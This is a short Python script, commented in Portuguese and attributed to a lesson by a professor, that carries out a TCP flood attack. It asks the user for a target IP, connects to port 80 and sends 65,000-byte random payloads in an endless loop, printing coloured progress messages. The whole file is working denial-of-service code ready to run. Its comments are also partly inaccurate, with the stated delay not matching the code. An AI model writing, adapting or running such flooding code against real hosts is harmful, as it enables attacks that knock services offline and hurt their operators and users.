## TCP FLOOD script inspired by techniques from Professor Armando Ventura, aula 5.

import socket
import random
import time
from colorama import init, Fore, Style

# Inicializa o colorama para suportar cores no terminal
init(autoreset=True)

def tcp_flood():
    while True:
        ip = input(Fore.RED + "Enter target IP (or type 'q' to quit): " + Style.RESET_ALL)
        
        if ip.lower() == 'q':
            print(Fore.RED + "Exiting TCP flood operation." + Style.RESET_ALL)
            return  # Sai do loop
        
        try:
            # Cria um socket TCP (IPv4)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Tenta estabelecer uma conexão com o servidor
            sock.connect((ip, 80))  # Porta padrão 80, pode ser alterada conforme necessário
            print(Fore.YELLOW + f"Starting TCP flood attack on {ip}..." + Style.RESET_ALL)
            
            sent = 0  # Contador de pacotes enviados

            # Loop para enviar pacotes continuamente
            while True:
                # Gera um pacote de 65000 bytes aleatórios
                bytes = random._urandom(65000)
                
                try:
                    # Mensagem de depuração antes de enviar o pacote
                    print(Fore.BLUE + f"Attempting to send packet {sent + 1} to {ip}..." + Style.RESET_ALL)
                    
                    # Envia pacotes para o IP e porta especificados
                    sock.send(bytes)
                    
                    # Exibe uma mensagem a cada pacote enviado
                    print(Fore.GREEN + f"Sent {sent + 1} packet(s) to {ip}" + Style.RESET_ALL)
                    
                    # Incrementa o contador de pacotes enviados
                    sent += 1
                    
                    # Aguarda 0.10 segundos antes de enviar o próximo pacote
                    time.sleep(0.0001)
                
                except Exception as e:
                    print(Fore.RED + f"Error sending packet: {e}" + Style.RESET_ALL)
                    break

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\nInterrupted by user. Exiting..." + Style.RESET_ALL)
            break
        except Exception as e:
            print(Fore.RED + f"An error occurred: {e}" + Style.RESET_ALL)
            break

if __name__ == "__main__":
    tcp_flood()